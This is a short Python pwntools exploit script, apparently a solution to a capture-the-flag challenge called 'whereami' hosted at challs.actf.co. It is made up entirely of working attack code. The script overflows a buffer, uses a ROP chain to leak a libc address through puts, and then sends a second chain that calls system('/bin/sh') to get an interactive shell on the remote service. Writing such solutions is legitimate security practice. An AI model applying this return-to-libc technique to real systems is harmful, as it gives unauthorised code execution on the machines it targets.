from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

elf = ELF('./whereami')
# p = elf.process()
p = remote('challs.actf.co', 31222)

offset = 72
pop_rdi = 0x401303
ret = pop_rdi + 1
pop_rbp = 0x4011dd

payload = b'a'*offset
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.sym.puts)
payload += p64(pop_rbp)
payload += p64(0x404900 + 0x40)
payload += p64(0x401275)

p.recv()
p.sendline(payload)

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym.puts
print(hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym.system

payload = b'a'*offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.recv()
p.sendline(payload)

p.interactive()